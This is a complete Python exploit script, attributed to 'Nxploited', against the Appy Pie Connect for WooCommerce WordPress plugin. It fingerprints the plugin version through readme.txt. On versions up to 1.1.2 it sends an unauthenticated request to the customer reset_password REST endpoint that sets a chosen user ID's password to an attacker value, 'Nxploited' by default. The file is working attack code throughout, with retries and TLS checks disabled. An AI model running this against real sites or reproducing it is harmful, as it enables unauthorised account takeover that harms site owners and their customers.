#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# By Nxploited ( Khaled Alenazi )


import sys
import argparse
import requests
import time
from colorama import Fore, Style

DEFAULT_PASSWORD = "Nxploited"
PLUGIN_PATH = "/wp-content/plugins/appy-pie-connect-for-woocommerce/readme.txt"
RESET_PATH = "/wp-json/wc/v3/customer/reset_password"
STABLE_TAG_LINE = "Stable tag:"
EXPLOITABLE_VERSION = "1.1.2"
SUCCESS_RESPONSE = '{"data":{"status":200},"message":"Password reset successfully."}'

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Nxploited/1.0)",
    "Accept": "*/*",
    "Connection": "keep-alive",
    "Content-Type": "application/json"
}

def check_plugin_version(site_url):
    url = _normalize_url(site_url) + PLUGIN_PATH
    print(f"[+] Checking plugin version: {url}")
    for i in range(5):  # retries
        try:
            r = requests.get(url, headers=HEADERS, timeout=10, verify=False)
            if r.status_code == 200 and STABLE_TAG_LINE in r.text:
                version = _extract_version(r.text)
                if version and _is_vulnerable_version(version):
                    print(Fore.YELLOW + f"[!] Vulnerable plugin detected ({version}). Attempting exploitation..." + Style.RESET_ALL)
                    return True, version
                else:
                    print(Fore.GREEN + f"[+] Plugin version is not vulnerable ({version})" + Style.RESET_ALL)
                    return False, version
            else:
                print(f"[-] Failed to retrieve readme.txt (status: {r.status_code}), retrying...")
        except Exception as e:
            print(f"[-] Error: {e}, retrying...")
        time.sleep(2)
    print("[-] Could not retrieve plugin version reliably.")
    return False, None

def _extract_version(text):
    for line in text.splitlines():
        if line.strip().startswith(STABLE_TAG_LINE):
            return line.split(STABLE_TAG_LINE)[-1].strip()
    return None

def _is_vulnerable_version(version):
    try:
        v = [int(x) for x in version.split('.')]
        e = [int(x) for x in EXPLOITABLE_VERSION.split('.')]
        return v <= e
    except Exception:
        return False

def exploit(site_url, user_id, password):
    url = _normalize_url(site_url) + RESET_PATH
    data = {
        "user_id": user_id,
        "password": password
    }
    print(Fore.CYAN + "[*] Please wait, attempting to change password..." + Style.RESET_ALL)
    for i in range(5):  # retries
        try:
            r = requests.post(url, headers=HEADERS, json=data, timeout=15, verify=False)
            if r.status_code == 200 and SUCCESS_RESPONSE in r.text:
                print(Fore.GREEN + "[+] Exploit successful! Password has been reset." + Style.RESET_ALL)
                print(Fore.YELLOW + f"[*] New password: {password}" + Style.RESET_ALL)
                return True
            elif r.status_code == 200:
                print(f"[!] Response received: {r.text}")
            else:
                print(f"[-] Exploit attempt failed (status: {r.status_code}), retrying...")
        except Exception as e:
            print(f"[-] Error: {e}, retrying...")
        time.sleep(2)
    print(Fore.RED + "[-] Exploit failed after multiple attempts." + Style.RESET_ALL)
    return False

def _normalize_url(url):
    url = url.strip().rstrip('/')
    if not url.startswith("http"):
        url = "http://" + url
    return url

def main():
    parser = argparse.ArgumentParser(description="Nxploited AppyPie Woo Exploit PoC")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., example.com)")
    parser.add_argument("-id", "--user_id", required=True, help="Target user ID for password reset")
    parser.add_argument("-p", "--password", default=DEFAULT_PASSWORD, help="New password (default: Nxploited)")
    args = parser.parse_args()

    vulnerable, version = check_plugin_version(args.url)
    if vulnerable:
        success = exploit(args.url, args.user_id, args.password)
        if success:
            print(Fore.GREEN + "[+] Vulnerability exploited and password changed successfully." + Style.RESET_ALL)
        else:
            print(Fore.RED + "[-] Exploit failed. Target may be patched or unreachable." + Style.RESET_ALL)
    else:
        print(Fore.RED + "[-] Target is not vulnerable or plugin not found." + Style.RESET_ALL)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user. Exiting...")
